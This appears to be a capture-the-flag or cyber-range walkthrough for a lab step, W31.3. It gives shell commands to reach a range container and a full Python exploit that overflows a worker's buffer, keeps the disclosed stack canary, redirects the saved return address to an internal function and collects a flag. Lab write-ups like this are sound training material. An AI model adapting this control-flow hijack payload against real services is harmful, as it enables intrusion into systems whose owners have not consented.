# W31.3 Walkthrough: The state execution returns to

Use the boundary overflow to control the saved return state while the canary stays
correct. The worker has NX, PIE, and a stack canary. The vault status record
discloses the canary and the base, so you do not need an info leak.

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user fieldlink --workdir /var/lib/fieldlink-connector cinder-arwc-connector bash -l
```

Prerequisite: W31.2 (`receipts/process-session`).

## Values from the disclosed status and the worker binary

- `image_base = status_address - status_offset = 0x555550000000`.
- `canary = 0x91d4c6aa72be3f05` (from the status record).
- `export_history` file offset `0x125a`; `protected_history_id` file offset `0x2180`
  (from `nm /tmp/dvl-worker`). The runtime addresses are `image_base + offset`.

The overflow payload fills the workspace, keeps the canary, sets `saved_rbp` inside
the worker mapping, sets `return_state` to `export_history`, and sets the argument to
`protected_history_id`. `header_length` is 320 so the copy reaches the argument field.

## Step 1: send the divergence record (W31.3 acceptance check)

```python
import json, ssl, urllib.request, pathlib, base64, struct
ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
ps = pathlib.Path("receipts/process-session").read_text().strip()
H = {"Authorization": "Bearer " + ps, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

def crc32c(data):
    crc = 0xffffffff
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0x82f63b78 if (crc & 1) else (crc >> 1)
    return crc ^ 0xffffffff

BASE = 0x555550000000
ws = (bytearray(b"A" * 288)
      + struct.pack("<Q", 0x91d4c6aa72be3f05)   # canary at 288
      + struct.pack("<Q", BASE + 0x1229)         # saved_rbp at 296 (in mapping)
      + struct.pack("<Q", BASE + 0x125a)         # return_state at 304 -> export_history
      + struct.pack("<Q", BASE + 0x2180))        # argument at 312 -> protected_history_id
rec = bytearray(b"DVL1") + struct.pack("<H", 1) + struct.pack("<H", 320) + struct.pack("<I", 0) + bytes(ws)
rec[8:12] = struct.pack("<I", crc32c(bytes(rec[12:])))
body = json.dumps({"case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
                   "record_b64": base64.b64encode(bytes(rec)).decode()}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://process-view.arwc.test/api/replay-sessions/current/divergence",
                           data=body, headers=H, method="POST"), context=ctx).read())
print("flag:", d["flag"])
print("execution_id:", d["record"]["execution_id"])
print("correlation:", d["record"]["correlation"])
print("history_digest:", d["record"]["history_digest"])
```

Output `flag: FLAG{eeb8cd2277f9cad3}` with `canary_preserved: true`. Keep
`execution_id`, `correlation`, and `history_digest` for W31.4.
